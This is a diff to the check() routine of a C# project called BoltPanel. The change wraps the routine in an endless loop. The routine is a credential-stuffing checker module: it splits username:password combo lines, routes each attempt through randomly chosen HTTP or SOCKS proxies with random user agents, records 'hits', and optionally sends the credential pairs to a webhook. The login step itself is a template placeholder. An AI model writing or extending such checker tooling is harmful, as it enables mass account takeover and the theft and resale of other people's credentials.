@@ -151,44 +151,46 @@ namespace BoltPanel
 
         public static void check()
         {
-            using (var req = new HttpRequest())
-            {
-                try
+            for (;;) {
+                using (var req = new HttpRequest())
                 {
-                    string proxy = proxies.ElementAt<string>(new Random().Next(proxies.Count));
-                    var array = combos[comboIndex].Split(':', ';', '|');
-                    Interlocked.Increment(ref comboIndex);
-
-                    totalChecked++;
-
-                    switch (proxyType)
+                    try
                     {
-                        case "HTTP":
-                            req.Proxy = HttpProxyClient.Parse(proxy);
-                            req.Proxy.ConnectTimeout = 5000;
-                            break;
-                        case "SOCKS4":
-                            req.Proxy = Socks4ProxyClient.Parse(proxy);
-                            req.Proxy.ConnectTimeout = 5000;
-                            break;
-                        case "SOCKS5":
-                            req.Proxy = Socks5ProxyClient.Parse(proxy);
-                            req.Proxy.ConnectTimeout = 5000;
-                            break;
+                        string proxy = proxies.ElementAt<string>(new Random().Next(proxies.Count));
+                        var array = combos[comboIndex].Split(':', ';', '|');
+                        Interlocked.Increment(ref comboIndex);
+
+                        totalChecked++;
+
+                        switch (proxyType)
+                        {
+                            case "HTTP":
+                                req.Proxy = HttpProxyClient.Parse(proxy);
+                                req.Proxy.ConnectTimeout = 5000;
+                                break;
+                            case "SOCKS4":
+                                req.Proxy = Socks4ProxyClient.Parse(proxy);
+                                req.Proxy.ConnectTimeout = 5000;
+                                break;
+                            case "SOCKS5":
+                                req.Proxy = Socks5ProxyClient.Parse(proxy);
+                                req.Proxy.ConnectTimeout = 5000;
+                                break;
+                        }
+
+                        req.UserAgent = Http.RandomUserAgent();
+
+                        // Hit
+                        hits++;
+                        Utils.AsResult("/Module_Name", array[0] + ":" + array[1]);
+                        if (webhook)
+                            Utils.sendTowebhook(array[0] + ":" + array[1], "Module name");
+
                     }
-
-                    req.UserAgent = Http.RandomUserAgent();
-
-                    // Hit
-                    hits++;
-                    Utils.AsResult("/Module_Name", array[0] + ":" + array[1]);
-                    if (webhook)
-                        Utils.sendTowebhook(array[0] + ":" + array[1], "Module name");
-
-                }
-                catch (Exception ex)
-                {
-                    errors++;
+                    catch (Exception ex)
+                    {
+                        errors++;
+                    }
                 }
             }
         }
